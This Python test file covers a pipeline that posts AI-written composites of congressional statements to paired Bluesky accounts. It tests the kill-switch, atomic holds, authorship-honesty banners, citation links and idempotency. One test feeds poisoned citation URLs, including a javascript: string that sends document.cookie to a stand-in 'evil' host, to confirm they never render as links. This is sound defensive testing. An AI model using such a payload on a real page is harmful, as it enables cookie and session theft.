"""Wave-0 hardening tests (BUILDLOG Session-4 item 2 + docs/11-BUILD-PROGRAM.md §1).

Covers the launch-critical gate and the honesty/receipts fixes, plus the Session-5 review fixes:
  * POSTING_ENABLED kill-test — no path posts when the switch is off, regardless of creds.
  * FEATURES registry — dark by default; feature_on gates on the flag.
  * honesty banner (HIGH-2) — deterministic template output (and the legacy 'sonnet_batch' label)
    is disclosed as "not a language model"; only genuine LLM generators are production.
  * receipts (e) — verified talking points resolve to >=3 real (member, date, URL) rows that render;
    non-http(s) citation urls (MEDIUM-1) are never emitted as links.
  * quiet line (g) — thin days still cite the top synchronized phrase (as a measured phrase, unquoted).
  * P2 quote (f) + HIGH-1 — the quote is a clean VERBATIM fragment the verifier grounds against real
    speech, never the punctuation-stripped label; labels/top-phrase are never self-grounded.
  * posting day (a) — post day comes from the assemble manifest, not collect's focus_day.
  * posting main() — idempotent re-runs never double-post (MEDIUM-2); a thrown post still fires the
    dead-man because the error result carries creds_present (HIGH-3).
"""
import os
import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent.parent))

from pipeline import config, distill, post_bluesky, run_assemble, site, util  # noqa: E402


def _env(**kv):
    """Set env vars, returning a restore() that puts them back."""
    prev = {k: os.environ.get(k) for k in kv}
    for k, v in kv.items():
        if v is None:
            os.environ.pop(k, None)
        else:
            os.environ[k] = v

    def restore():
        for k, v in prev.items():
            if v is None:
                os.environ.pop(k, None)
            else:
                os.environ[k] = v
    return restore


_DAY_JSON = {
    "day": "2026-06-30",
    "daily_lines": {"D": {"composite": "Today we spoke.", "generator": "sonnet_batch"},
                    "R": {"composite": "Today we also spoke.", "generator": "sonnet_batch"}},
    "top_synchronized": [{"party": "D", "ngram": "border security now", "day_peak": 5,
                          "first_seen": {"date": "2026-06-30"}}],
}


# --- POSTING_ENABLED kill-test + atomicity (the launch switch) -----------------------------
def test_killtest_posting_disabled_never_authenticates_or_posts():
    """The core safety gate: creds present but POSTING_ENABLED off => NO auth, NO post, ever."""
    restore = _env(POSTING_ENABLED=None, BSKY_BLUE_HANDLE="b", BSKY_BLUE_PASSWORD="x",
                   BSKY_RED_HANDLE="r", BSKY_RED_PASSWORD="y")

    def boom(*a, **k):
        raise AssertionError("network touched with posting disabled!")

    try:
        assert config.posting_enabled() is False
        rc, m = _run_main_with("2026-06-30", _DAY_JSON, {}, authenticate=boom, post_thread=boom, ntfy_sink=[])
        res = {r["party"]: r for r in m["results"]}
        assert all(res[p]["posted"] is False and res[p]["reason"] == "posting disabled" for p in ("D", "R"))
        assert res["D"]["creds_present"] is True and m["posting_enabled"] is False
    finally:
        restore()


def test_posting_on_missing_creds_holds_both_atomically():
    """Posting ON but a due party has no creds => hold BOTH (never post one alone) + alert."""
    restore = _env(POSTING_ENABLED="1", BSKY_BLUE_HANDLE="b", BSKY_BLUE_PASSWORD="x",
                   BSKY_RED_HANDLE=None, BSKY_RED_PASSWORD=None)  # R has no creds

    def boom(*a, **k):
        raise AssertionError("network touched despite a missing-creds hold!")

    ntfy = []
    try:
        rc, m = _run_main_with("2026-06-30", _DAY_JSON, {}, authenticate=boom, post_thread=boom, ntfy_sink=ntfy)
        assert m["atomic_hold"] is True
        res = {r["party"]: r for r in m["results"]}
        assert all(res[p]["posted"] is False for p in ("D", "R")) and "creds missing" in res["D"]["reason"]
        assert ntfy  # the misconfiguration is alerted, not silent
    finally:
        restore()


def test_atomic_hold_when_one_account_auth_fails():
    """§Session-8 blocker: a wrong/expired app-password on ONE account holds BOTH — the good account
    never posts alone (which reads as bias). The auth pre-flight catches it before any post."""
    restore = _env(POSTING_ENABLED="1", BSKY_BLUE_HANDLE="b", BSKY_BLUE_PASSWORD="x",
                   BSKY_RED_HANDLE="r", BSKY_RED_PASSWORD="wrong")
    posted = []

    def auth(h, pw):
        if pw == "wrong":
            raise RuntimeError("401 Unauthorized")
        return {"base": "x", "jwt": "j", "did": "did:plc:" + h}

    def thread(session, thr, on_root=None, root_rkey=None):
        posted.append(session["did"])
        (on_root or (lambda u: None))("at://x/root")
        return {"root_uri": "at://x/root", "posts_written": len(thr)}

    ntfy = []
    try:
        rc, m = _run_main_with("2026-06-30", _DAY_JSON, {}, authenticate=auth, post_thread=thread, ntfy_sink=ntfy)
        assert posted == []  # the well-authed account was HELD — nothing posted
        assert m["atomic_hold"] is True and ntfy
        res = {r["party"]: r for r in m["results"]}
        assert all(res[p]["posted"] is False and "auth failed" in res[p]["reason"] for p in ("D", "R"))
    finally:
        restore()


def test_both_post_when_all_accounts_authenticate():
    restore = _env(POSTING_ENABLED="1", BSKY_BLUE_HANDLE="b", BSKY_BLUE_PASSWORD="x",
                   BSKY_RED_HANDLE="r", BSKY_RED_PASSWORD="y")
    try:
        rc, m = _run_main_with("2026-06-30", _DAY_JSON, {}, ntfy_sink=[])  # defaults: auth ok, post ok
        res = {r["party"]: r for r in m["results"]}
        assert all(res[p]["posted"] is True and res[p].get("root_uri") for p in ("D", "R"))
        assert m["asymmetric"] is False and m["atomic_hold"] is False
    finally:
        restore()


def test_empty_composite_for_one_party_holds_both_atomically():
    """§Session-8b (adversarial-review): one party's composite is missing/empty. Posting the other
    party's real thread + a near-empty root reads as bias but slips past the asymmetric guard (both
    'posted'). So a missing composite must hold BOTH + alert — never post one alone."""
    restore = _env(POSTING_ENABLED="1", BSKY_BLUE_HANDLE="b", BSKY_BLUE_PASSWORD="x",
                   BSKY_RED_HANDLE="r", BSKY_RED_PASSWORD="y")
    day_json = {"day": "2026-06-30",
                "daily_lines": {"D": {"composite": "Today we spoke.", "generator": "llm"},
                                "R": {"composite": "   ", "generator": "llm"}},  # R blank
                "top_synchronized": []}

    def boom(*a, **k):
        raise AssertionError("network touched despite an empty-composite hold!")

    ntfy = []
    try:
        rc, m = _run_main_with("2026-06-30", day_json, {}, authenticate=boom, post_thread=boom, ntfy_sink=ntfy)
        assert m["atomic_hold"] is True
        res = {r["party"]: r for r in m["results"]}
        assert all(res[p]["posted"] is False for p in ("D", "R")) and "no composite" in res["D"]["reason"]
        assert ntfy  # the empty-output anomaly is alerted, not silently one-sided
    finally:
        restore()


def test_split_never_emits_empty_or_overlength_posts():
    """§Session-8b: the thread splitter's invariants — no empty post (would fail createRecord for one
    party alone), no over-length post (a lone token past the limit is hard-sliced)."""
    assert post_bluesky._split("") == [""]                          # degenerate: exactly one placeholder
    packed = post_bluesky._split(("word " * 200).strip(), limit=50)
    assert packed and all(0 < len(p) <= 50 for p in packed)         # no empty, none over-length
    sliced = post_bluesky._split("x" * 130, limit=50)               # lone oversize token, hard-sliced
    assert sliced == ["x" * 50, "x" * 50, "x" * 30]
    mixed = post_bluesky._split("hi " + "y" * 120, limit=50)        # a normal word then an oversize one
    assert all(0 < len(p) <= 50 for p in mixed) and "hi" in mixed[0]


def test_every_post_carries_the_composite_marker_and_stays_in_limit():
    """docs/19 §4c — the AI-composite marker must survive a cropped screenshot, so it rides on EVERY
    post unit (composite chunks + receipts + tail), not just the thread head or the account bio. And a
    live post (generator != 'dry_run') must still carry it — the old tail was dry-run-only."""
    dj = {"daily_lines": {"D": {"composite": ("Today 51 of us released statements. " * 12).strip(),
                                "generator": "sonnet_direct"}},          # LIVE generator, not dry_run
          "top_synchronized": [{"party": "D", "ngram": "border security now", "day_peak": 5,
                                "first_seen": {"date": "2026-06-30"}}]}
    thread = post_bluesky.build_thread("2026-06-30", "D", dj)
    assert len(thread) >= 2
    assert all(post_bluesky._POST_MARK in p for p in thread), "a post lacked the AI-composite marker"
    assert all(0 < len(p) <= 300 for p in thread), "a marked post is empty or over the 300-char limit"


# --- FEATURES registry --------------------------------------------------------------------
# Flags that have been DELIBERATELY RELEASED, newest last. A release adds its name here in the SAME
# commit that flips the flag — which is the point: the flip stops being a one-character diff nobody can
# review and becomes an explicit, named act with a test asserting it was intended.
#
# This replaced a blanket `all(v is False ...)`. That assertion encoded the right INTENT (no feature
# reaches the public by accident) with a predicate that made every deliberate release a test failure —
# so the first real flip would have reddened the suite on launch morning, and the reflex fix would have
# been to delete the guard entirely. An allowlist keeps the guard and prices the release honestly.
DELIBERATELY_RELEASED: set[str] = set()


def test_features_dark_by_default_and_gated():
    unreleased = {k: v for k, v in config.FEATURES.items() if k not in DELIBERATELY_RELEASED}
    assert all(v is False for v in unreleased.values()), (
        f"a feature is live without being declared a deliberate release: "
        f"{[k for k, v in unreleased.items() if v]} — add it to DELIBERATELY_RELEASED in the flip commit")
    assert DELIBERATELY_RELEASED <= set(config.FEATURES), (
        f"DELIBERATELY_RELEASED names a flag that does not exist: "
        f"{DELIBERATELY_RELEASED - set(config.FEATURES)}")
    assert all(config.FEATURES[k] is True for k in DELIBERATELY_RELEASED), (
        "a flag declared released is actually dark — the list and the registry disagree")
    assert config.feature_on("archive") is False
    assert config.feature_on("does_not_exist") is False
    config.FEATURES["archive"] = True
    try:
        assert config.feature_on("archive") is True
    finally:
        config.FEATURES["archive"] = False


# --- honesty banner (d) + HIGH-2 (deterministic stub must not pose as production Sonnet) ----
def test_real_llm_day_needs_no_banner():
    """A genuine LLM-voice day with a clean verifier shows no honesty banner."""
    live = {"daily_lines": {"D": {"composite": "x", "generator": "llm",
                                  "verifier": {"checked": True, "passed": True}},
                            "R": {"composite": "y", "generator": "llm",
                                  "verifier": {"checked": True, "passed": True}}}}
    need, msg, has_stub = site.honesty_state(live, None)
    assert need is False and has_stub is False
    assert site.banner_html(live, None) == ""


def test_deterministic_and_legacy_sonnet_batch_are_disclosed_as_stub():
    """HIGH-2: deterministic template output — and the legacy 'sonnet_batch' mislabel — is disclosed
    as 'not a language model', never presented as production Sonnet."""
    for gen in ("deterministic", "sonnet_batch"):
        day = {"daily_lines": {"D": {"composite": "x", "generator": gen,
                                     "verifier": {"checked": True, "passed": True}},
                               "R": {"composite": "y", "generator": gen,
                                     "verifier": {"checked": True, "passed": True}}}}
        need, msg, has_stub = site.honesty_state(day, None)
        assert need is True and has_stub is True, gen
        assert "not a language model" in site.banner_html(day, None), gen


def test_real_quiet_day_flags_without_stub_copy():
    """A genuine LLM day that is merely quiet gets a transparency flag, NOT the stub-voice copy."""
    quiet_live = {"daily_lines": {"D": {"composite": "x", "generator": "llm", "quiet": True,
                                        "verifier": {"checked": True, "passed": True}},
                                  "R": {"composite": "y", "generator": "llm",
                                        "verifier": {"checked": True, "passed": True}}}}
    need, msg, has_stub = site.honesty_state(quiet_live, None)
    assert need is True and has_stub is False and "quiet-day" in msg
    html = site.banner_html(quiet_live, None)
    assert "not a language model" not in html and "placeholder" not in html


def test_dry_run_is_disclosed_as_stub():
    dry = {"daily_lines": {"D": {"composite": "x", "generator": "dry_run"},
                           "R": {"composite": "y", "generator": "dry_run"}}}
    need, msg, has_stub = site.honesty_state(dry, None)
    assert need is True and has_stub is True and "dry-run stub" in msg
    assert "placeholder" in site.banner_html(dry, None)


def test_voice_flags_suppress_false_model_on_stub_generators():
    """Render-time honesty (fixes EVERY day page incl. historical): a non-production generator never
    stamps a model id — a stale 'claude-sonnet-5' would falsely claim LLM authorship and contradict
    the banner. A genuine production generator shows its model truthfully."""
    for gen, model in (("sonnet_batch", "claude-sonnet-5"), ("deterministic", "P2:deterministic"),
                       ("dry_run", "P2:dry_run")):
        joined = " ".join(site._voice_flags({"generator": gen, "model": model}))
        assert "deterministic template" in joined and "not a language model" in joined, gen
        assert "claude-sonnet-5" not in joined and model not in joined, gen
        assert "generator: sonnet_batch" not in joined, gen  # legacy mislabel never re-surfaced
    prod = " ".join(site._voice_flags({"generator": "llm", "model": "claude-sonnet-5"}))
    assert "generator: llm" in prod and "model: claude-sonnet-5" in prod
    assert site._voice_flags({}) == []  # no generator -> no flags


# --- receipts (e) -------------------------------------------------------------------------
def test_citations_resolve_three_members_with_urls():
    stmt_by_id = {
        "s1": {"member": {"bioguide": "A1", "party": "D", "state": "CA"}, "published_at": "2026-06-30",
               "url": "https://a1.house.gov/x"},
        "s2": {"member": {"bioguide": "B2", "party": "D", "state": "NY"}, "published_at": "2026-06-29",
               "url": "https://b2.house.gov/y"},
        "s3": {"member": {"bioguide": "C3", "party": "D", "state": "TX"}, "published_at": "2026-06-28",
               "url": "https://c3.senate.gov/z"},
    }
    tp = {"statements": ["s1", "s2", "s3"], "fragments": []}
    cites = run_assemble._citations(tp, stmt_by_id, {}, k=3)
    assert len(cites) == 3
    assert all(c["url"] and c["date"] and c["member"] for c in cites)
    assert {c["url"] for c in cites} == {"https://a1.house.gov/x", "https://b2.house.gov/y", "https://c3.senate.gov/z"}


def test_receipts_strip_renders_citation_links():
    tps = [{"member_count": 3, "fragments": [{"text": "protect the border"}], "topics": ["immigration"],
            "citations": [{"member": "Jane Doe", "party": "D", "state": "CA", "date": "2026-06-30",
                           "url": "https://doe.house.gov/press/x"}]}]
    html = site.receipts_strip("D", tps)
    assert 'href="https://doe.house.gov/press/x"' in html
    assert "Jane Doe" in html and "2026-06-30" in html


def test_receipts_strip_rejects_non_http_scheme_urls():
    """MEDIUM-1: a poisoned citation url (javascript:/data:) must NOT become a clickable link on a
    site that advertises zero JS. The row still renders (member/date), just with no href."""
    for bad in ("javascript:fetch('https://evil/'+document.cookie)", "data:text/html,<script>x</script>",
                "vbscript:msgbox", "  JavaScript:alert(1)"):
        tps = [{"member_count": 3, "fragments": [{"text": "protect the border"}], "topics": [],
                "citations": [{"member": "Mal Actor", "party": "D", "state": "CA",
                               "date": "2026-06-30", "url": bad}]}]
        html = site.receipts_strip("D", tps)
        assert "<a href" not in html, bad          # never emitted as a link
        assert "javascript" not in html.lower() and "vbscript" not in html.lower(), bad
        assert "Mal Actor" in html                 # the receipt row still shows


# --- quiet line (g) -----------------------------------------------------------------------
def test_quiet_line_cites_top_phrase_and_verifies():
    party_stmts = [{"id": f"s{i}", "text": "x", "member": {"bioguide": str(i), "party": "D"},
                    "published_at": "2026-06-30", "lane": 1} for i in range(10)]  # < QUIET_DAY_MAX
    top_phrase = {"text": "border security now", "members": 4}
    dl = distill.daily_line("D", "2026-06-30", party_stmts, [], top_phrase, {s["id"]: s for s in party_stmts})
    assert dl["quiet"] is True and dl["fallback"] is False
    assert dl["verifier"]["passed"] is True
    # HIGH-1: the top phrase is a code-computed ledger n-gram, cited as a MEASURED phrase (no quote
    # marks — it is not verbatim member speech), so nothing ungrounded is quoted and the line verifies.
    assert "border security now" in dl["composite"] and "4 of us" in dl["composite"]
    assert '"border security now"' not in dl["composite"]  # never rendered as a verbatim quote


# --- P2 quote selection (f) + HIGH-1 (quote must be verbatim, never the tokenized label) ---
def test_build_stats_quote_is_a_clean_verbatim_fragment_not_the_label():
    """The quote is verbatim member speech (the shortest, clean fragment), never the punctuation-
    stripped cluster label — so the blocking verifier can ground it against real text."""
    tp = {"label": "21st century road to housing", "member_count": 4,
          "fragments": [
              {"text": "who supports the 21st century road to housing act's historic passage today"},
              {"text": "the 21st century road to housing act"},  # shortest, clean, verbatim
          ], "topics": []}
    stats = distill.build_stats("D", "2026-06-30", 40, [tp], None)
    q = stats["talking_points"][0]["quote"]
    assert q == "the 21st century road to housing act"
    assert any(q in f["text"] for f in tp["fragments"])  # verbatim substring of real speech


def test_verifier_grounds_only_on_verbatim_fragments_not_labels():
    """HIGH-1 regression guard: the code-computed label is never quotable. A cluster whose label
    differs from its fragment only by punctuation quotes the FRAGMENT (with the comma) and verifies;
    the stripped label ('affordable accessible', no comma) never appears as a grounded quote."""
    tps = [{"id": "c1", "label": "support affordable accessible housing", "member_count": 3,
            "topics": [], "fragments": [{"text": "we support affordable, accessible housing for all"}]}]
    party_stmts = [{"id": f"s{i}", "text": "x", "member": {"bioguide": str(i), "party": "D"},
                    "published_at": "2026-06-30", "lane": 1} for i in range(60)]  # not quiet -> P2
    dl = distill.daily_line("D", "2026-06-30", party_stmts, tps, None, {s["id"]: s for s in party_stmts})
    assert dl["fallback"] is False and dl["verifier"]["passed"] is True
    assert "affordable, accessible" in dl["composite"]      # the verbatim fragment (with comma)
    assert "affordable accessible" not in dl["composite"]   # the stripped label is NOT quoted


# --- posting day resolution (a) -----------------------------------------------------------
def test_post_day_comes_from_assemble_manifest_not_collect():
    orig = post_bluesky.util.read_json
    post_bluesky.util.read_json = lambda p, default=None: {"day": "2099-01-01"}
    try:
        assert post_bluesky.resolve_day(None) == "2099-01-01"       # from assemble-latest
        assert post_bluesky.resolve_day("2030-05-05") == "2030-05-05"  # explicit --day wins
    finally:
        post_bluesky.util.read_json = orig


# --- main() integration: idempotency (MEDIUM-2) + dead-man on error (HIGH-3) ---------------
def _run_main_with(day, day_json, prior, *, authenticate=None, post_thread=None, ntfy_sink=None,
                   list_manifests=None, extra_reads=None):
    """Drive post_bluesky.main() with all I/O + AT-Proto network stubbed. Returns (rc, manifest).
    `list_manifests` defaults to [] so the hard-kill reconciliation scan is a no-op here — a test that
    exercises reconciliation injects prior manifest paths + their content via `extra_reads` (keyed by
    file basename)."""
    from pathlib import Path as _P
    writes = {}
    extra_reads = extra_reads or {}

    def fake_read(p, default=None):
        name = _P(str(p)).name
        if name in extra_reads:
            return extra_reads[name]
        if name == "assemble-latest.json":
            return {"day": day}
        if name == f"{day}.json":
            return day_json
        if name == f"post-{day}.json":
            return prior
        return {} if default is None else default

    def default_auth(h, pw):
        return {"base": "x", "jwt": "j", "did": "did:plc:" + str(h)}

    def default_thread(session, thread, on_root=None, root_rkey=None):
        uri = "at://" + session["did"] + "/root"
        if on_root:
            on_root(uri)
        return {"root_uri": uri, "posts_written": len(thread)}

    saved = (post_bluesky.util.read_json, post_bluesky.util.write_json, post_bluesky._authenticate,
             post_bluesky._post_thread, post_bluesky._ensure_bot_label, post_bluesky.ops.ntfy,
             post_bluesky._list_manifests, sys.argv)
    post_bluesky.util.read_json = fake_read
    post_bluesky.util.write_json = lambda p, obj: writes.__setitem__(_P(str(p)).name, obj)
    post_bluesky._authenticate = authenticate or default_auth
    post_bluesky._post_thread = post_thread or default_thread
    post_bluesky._ensure_bot_label = lambda s: None
    post_bluesky.ops.ntfy = lambda *a, **k: (ntfy_sink if ntfy_sink is not None else []).append((a, k))
    post_bluesky._list_manifests = list_manifests or (lambda: [])
    sys.argv = ["post", "--day", day]
    try:
        rc = post_bluesky.main()
    finally:
        (post_bluesky.util.read_json, post_bluesky.util.write_json, post_bluesky._authenticate,
         post_bluesky._post_thread, post_bluesky._ensure_bot_label, post_bluesky.ops.ntfy,
         post_bluesky._list_manifests, sys.argv) = saved
    return rc, writes.get(f"post-{day}.json", {})


def test_idempotency_skips_party_already_posted_with_root_uri():
    """MEDIUM-2: a re-run never re-posts a party whose prior run recorded a real root URI; the other
    party still runs."""
    restore = _env(POSTING_ENABLED="1", BSKY_BLUE_HANDLE="b", BSKY_BLUE_PASSWORD="x",
                   BSKY_RED_HANDLE="r", BSKY_RED_PASSWORD="y")
    day = "2026-06-30"
    prior = {"results": [{"party": "D", "posted": True, "root_uri": "at://d/root", "thread": ["d"]}]}
    posted = []

    def thread(session, thr, on_root=None, root_rkey=None):
        posted.append(session["did"])
        if on_root:
            on_root("at://r/root")
        return {"root_uri": "at://r/root", "posts_written": len(thr)}

    try:
        rc, m = _run_main_with(day, _DAY_JSON, prior, post_thread=thread, ntfy_sink=[])
        assert rc == 0 and posted == ["did:plc:r"]  # only R posted; D skipped (had a root URI)
        res = {r["party"]: r for r in m["results"]}
        assert res["D"].get("idempotent_skip") is True and res["D"]["root_uri"] == "at://d/root"
        assert res["R"]["posted"] is True
    finally:
        restore()


def test_partial_post_records_root_and_a_rerun_does_not_duplicate():
    """§Session-8 blocker: when a thread fails AFTER its root post is live, the root URI is recorded
    (posted=True, partial), so a re-run SKIPS that party — never a duplicate head post."""
    restore = _env(POSTING_ENABLED="1", BSKY_BLUE_HANDLE="b", BSKY_BLUE_PASSWORD="x",
                   BSKY_RED_HANDLE="r", BSKY_RED_PASSWORD="y")
    day = "2026-06-30"

    def partial(session, thr, on_root=None, root_rkey=None):
        on_root("at://" + session["did"] + "/root")     # root goes live...
        if session["did"].endswith("b"):
            raise RuntimeError("network died after root")  # ...then D's replies fail
        return {"root_uri": "at://" + session["did"] + "/root", "posts_written": len(thr)}

    try:
        rc, m1 = _run_main_with(day, _DAY_JSON, {}, post_thread=partial, ntfy_sink=[])
        r1 = {r["party"]: r for r in m1["results"]}
        assert r1["D"]["posted"] is True and r1["D"]["root_uri"].endswith("b/root") and r1["D"].get("partial") is True
        # re-run with m1 as prior: BOTH already have a root URI -> nothing is re-posted (no duplicate)
        reposted = []
        rc, m2 = _run_main_with(day, _DAY_JSON, m1, ntfy_sink=[],
                                post_thread=lambda s, t, on_root=None, root_rkey=None: reposted.append(s["did"]))
        assert reposted == []
        assert {r["party"]: r for r in m2["results"]}["D"].get("idempotent_skip") is True
    finally:
        restore()


def test_symmetry_report_is_day_scoped_not_cumulative():
    """The nightly symmetry audit reports THIS DAY's ingestion/coverage, not cumulative corpus totals
    mislabeled under the day. caucus_size stays the full-corpus proxy, so coverage = share of the
    caucus that spoke that day. §Session-5."""
    from pipeline import ops
    stmts = (
        [{"member": {"party": "D", "bioguide": f"D{i}"}, "lane": 1, "published_at": "2026-07-13"} for i in range(3)]
        + [{"member": {"party": "D", "bioguide": "DOLD"}, "lane": 1, "published_at": "2025-01-01"}]  # older, must not count today
        + [{"member": {"party": "R", "bioguide": "R1"}, "lane": 1, "published_at": "2026-07-13"}]
    )
    saved = ops.util.write_json
    ops.util.write_json = lambda p, o: None  # no data/derived side effects in the test
    try:
        rep = ops.symmetry_report("2026-07-13", stmts, {}, freshness={}, degraded=False)
    finally:
        ops.util.write_json = saved
    d = rep["parties"]["D"]
    assert d["statements_ingested"] == 3      # only the day's 3, not the older 4th
    assert d["members_covered"] == 3          # D0,D1,D2 — DOLD did not speak today
    assert d["caucus_size"] == 4              # full corpus proxy still counts DOLD
    assert d["coverage_pct"] == 75.0          # 3 of the 4 known D members spoke that day
    assert rep["day"] == "2026-07-13"


def test_deadman_fires_on_asymmetric_post():
    """If one account posts but the paired account fails after both authed (a rare mid-post network
    failure), the ASYMMETRIC outcome must fire the dead-man — it must never sit silent."""
    restore = _env(POSTING_ENABLED="1", BSKY_BLUE_HANDLE="b", BSKY_BLUE_PASSWORD="x",
                   BSKY_RED_HANDLE="r", BSKY_RED_PASSWORD="y")
    day = "2026-06-30"
    ntfy = []

    def thread(session, thr, on_root=None, root_rkey=None):
        if session["did"].endswith("r"):        # R fails before its root -> clean failure
            raise RuntimeError("bsky 500")
        on_root("at://d/root")                   # D posts fully
        return {"root_uri": "at://d/root", "posts_written": len(thr)}

    try:
        rc, m = _run_main_with(day, _DAY_JSON, {}, post_thread=thread, ntfy_sink=ntfy)
        assert rc == 0 and m["asymmetric"] is True and ntfy
        res = {r["party"]: r for r in m["results"]}
        assert res["D"]["posted"] is True and res["R"]["posted"] is False
        assert res["R"]["creds_present"] is True   # so the missing-post detector also sees it
    finally:
        restore()


# --- (B) hard-kill reconciliation: a prior run's SILENT one-sided post must not sit unalerted -------
def _reconcile_fixtures(manifests):
    """Wire _reconcile_prior against an in-memory set of manifests keyed by path. Returns
    (alerts, writes, restore) where alerts/writes capture ntfy + mark-reconciled writes."""
    from pathlib import Path as _P
    store = dict(manifests)
    alerts, writes = [], {}
    saved = (post_bluesky._list_manifests, post_bluesky.util.read_json,
             post_bluesky.util.write_json, post_bluesky.ops.ntfy)
    post_bluesky._list_manifests = lambda: list(store.keys())
    post_bluesky.util.read_json = lambda p, d=None: store.get(str(p), {} if d is None else d)
    post_bluesky.util.write_json = lambda p, o: (store.__setitem__(str(p), o), writes.__setitem__(str(p), o))
    post_bluesky.ops.ntfy = lambda *a, **k: alerts.append((a, k))

    def restore():
        (post_bluesky._list_manifests, post_bluesky.util.read_json,
         post_bluesky.util.write_json, post_bluesky.ops.ntfy) = saved
    return alerts, writes, restore


def test_reconcile_alerts_once_on_a_prior_silent_asymmetric_manifest():
    """A prior day whose run was hard-killed mid-post (asymmetric, never end-of-run-deadman'd) is
    surfaced on the next run — exactly once — and marked reconciled so it never re-alerts."""
    path = "/m/post-2026-07-15.json"
    m = {"day": "2026-07-15", "asymmetric": True,
         "results": [{"party": "D", "posted": True, "root_uri": "at://d/x"},
                     {"party": "R", "posted": False}]}
    alerts, writes, restore = _reconcile_fixtures({path: m})
    try:
        out = post_bluesky._reconcile_prior("2026-07-16", posting_enabled=True)
        assert out == ["2026-07-15"] and len(alerts) == 1
        assert "UNRECONCILED" in alerts[0][0][1] and "2026-07-15" in alerts[0][0][1]
        assert writes[path]["reconciled"] is True          # marked so it won't re-fire
        alerts.clear()
        assert post_bluesky._reconcile_prior("2026-07-16", posting_enabled=True) == []   # idempotent
        assert alerts == []
    finally:
        restore()


def test_reconcile_alerts_on_a_partial_thread_too():
    path = "/m/post-2026-07-15.json"
    m = {"day": "2026-07-15", "asymmetric": False,
         "results": [{"party": "D", "posted": True, "root_uri": "at://d/x", "partial": True},
                     {"party": "R", "posted": True, "root_uri": "at://r/y"}]}
    alerts, _writes, restore = _reconcile_fixtures({path: m})
    try:
        assert post_bluesky._reconcile_prior("2026-07-16", posting_enabled=True) == ["2026-07-15"]
        assert len(alerts) == 1 and "partial=True" in alerts[0][0][1]
    finally:
        restore()


def test_reconcile_skips_current_day_clean_atomic_hold_and_dark():
    fixtures = {
        "/m/post-2026-07-16.json": {"day": "2026-07-16", "asymmetric": True,          # CURRENT day -> skip
                                    "results": [{"party": "D", "posted": True}]},
        "/m/post-2026-07-14.json": {"day": "2026-07-14", "asymmetric": False,         # clean symmetric
                                    "results": [{"party": "D", "posted": True}, {"party": "R", "posted": True}]},
        "/m/post-2026-07-13.json": {"day": "2026-07-13", "asymmetric": False, "atomic_hold": True,
                                    "results": [{"party": "D", "posted": False}, {"party": "R", "posted": False}]},
    }
    alerts, _w, restore = _reconcile_fixtures(fixtures)
    try:
        assert post_bluesky._reconcile_prior("2026-07-16", posting_enabled=True) == []   # nothing to alert
        assert alerts == []
        assert post_bluesky._reconcile_prior("2026-07-16", posting_enabled=False) == []  # dark -> no-op
    finally:
        restore()


def test_main_reconciles_a_prior_silent_post_before_todays_work():
    """End-to-end: main() runs the reconciliation scan up front, so a prior day's silent asymmetric
    post fires an alert even on a normal (clean) posting run today."""
    restore = _env(POSTING_ENABLED="1", BSKY_BLUE_HANDLE="b", BSKY_BLUE_PASSWORD="x",
                   BSKY_RED_HANDLE="r", BSKY_RED_PASSWORD="y")
    prior_path = "post-2026-06-29.json"
    prior_manifest = {"day": "2026-06-29", "asymmetric": True,
                      "results": [{"party": "D", "posted": True, "root_uri": "at://d/x"},
                                  {"party": "R", "posted": False}]}
    ntfy = []
    try:
        rc, m = _run_main_with(
            "2026-06-30", _DAY_JSON, {}, ntfy_sink=ntfy,
            list_manifests=lambda: [prior_path], extra_reads={prior_path: prior_manifest})
        # today posts cleanly (symmetric) AND the reconcile alert for the prior silent day fired
        msgs = " ".join(str(a) for a in ntfy)
        assert "UNRECONCILED prior run 2026-06-29" in msgs
        assert m["asymmetric"] is False   # today itself is clean/symmetric
    finally:
        restore()


def test_reconcile_scans_all_and_survives_a_corrupt_manifest():
    """No recent-window cap — a bad day must never age out (operator disables posting for weeks) — AND
    a corrupt manifest is skip-and-logged, never fatal, and never blocks reconciling other days."""
    good, bad = "/m/post-2020-01-01.json", "/m/post-2026-07-10.json"   # good is far past any 14-day window
    store = {good: {"day": "2020-01-01", "asymmetric": True,
                    "results": [{"party": "R", "posted": True}, {"party": "D", "posted": False}]},
             bad: "CORRUPT"}
    alerts = []
    saved = (post_bluesky._list_manifests, post_bluesky.util.read_json,
             post_bluesky.util.write_json, post_bluesky.ops.ntfy)

    def rd(p, d=None):
        v = store.get(str(p), {} if d is None else d)
        if v == "CORRUPT":
            raise ValueError("bad json")
        return v

    post_bluesky._list_manifests = lambda: list(store.keys())
    post_bluesky.util.read_json = rd
    post_bluesky.util.write_json = lambda p, o: store.__setitem__(str(p), o)
    post_bluesky.ops.ntfy = lambda *a, **k: alerts.append(a)
    try:
        out = post_bluesky._reconcile_prior("2026-07-16", posting_enabled=True)
        assert out == ["2020-01-01"] and len(alerts) == 1   # old day caught; corrupt one skipped, not fatal
    finally:
        (post_bluesky._list_manifests, post_bluesky.util.read_json,
         post_bluesky.util.write_json, post_bluesky.ops.ntfy) = saved
